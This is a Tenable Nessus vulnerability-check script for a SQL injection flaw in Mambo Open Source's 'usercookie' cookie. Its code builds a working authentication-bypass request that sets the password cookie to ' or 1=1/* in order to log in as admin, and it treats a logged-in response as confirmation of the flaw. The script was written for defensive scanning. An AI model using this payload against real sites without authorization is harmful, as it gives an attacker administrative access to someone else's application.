#
# (C) Tenable Network Security
#


if (description)
{
  script_id(22509);
  script_version("$Revision: 1.2 $");

  script_bugtraq_id(20366);

  script_name(english:"Mambo Open Source usercookie Parameter SQL Injection Vulnerability");
  script_summary(english:"Tries to bypass authentication in Mambo Open Source");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to a
SQL injection attack. 

Description :

The remote installation of Mambo Open Source fails to sanitize input
to the 'usercookie' cookie array before using it in a database query
to authenticate a user.  Provided PHP's 'magic_quotes_gpc' setting is
disabled, an attacker may be able to exploit this issue to manipulate
database queries and, for example, bypass authentication and gain
administrative access to the affected application. 

See also :

http://www.gulftech.org/?node=research&article_id=00116-10042006

Solution :

Unknown at this time. 

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("mambo_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to bypass authentication.
  req = http_get(item:string(dir, "/index.php"), port:port);
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Cookie: usercookie[username]=admin; usercookie[password]=", urlencode(str:"' or 1=1/*"), "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we are now authenticated.
  if (
    '<form action="index.php?option=logout"' >< res && 
    "Hi, " >< res
  ) security_warning(port);
}
